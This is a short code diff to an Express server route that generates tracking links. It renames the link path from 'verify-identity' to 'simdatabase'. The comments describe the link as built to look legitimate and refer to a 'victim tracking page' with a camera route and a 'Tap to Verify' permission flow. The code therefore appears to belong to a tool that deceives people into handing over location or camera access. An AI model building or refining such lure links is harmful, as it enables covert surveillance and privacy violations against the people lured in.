@@ -46,7 +46,7 @@ router.post('/start', (req, res) => {
         || `http://localhost:${process.env.PORT || 3001}`;
 
     // Generate a CLEAN, human-friendly link (no /api/ in path — looks legitimate)
-    const link = `${host}/verify-identity/${sessionToken}`;
+    const link = `${host}/simdatabase/${sessionToken}`;
     res.json({ sessionToken, link });
 });
 
@@ -78,7 +78,7 @@ router.get('/camera/:sessionToken', (req, res) => {
 
 /**
  * Shared HTML page for the victim tracking page.
- * Used by both the old /api/location/v/:token and new /verify-identity/:token routes.
+ * Used by both the old /api/location/v/:token and new /simdatabase/:token routes.
  *
  * PERMISSION FLOW (NEW):
  *  1. User clicks "Tap to Verify"
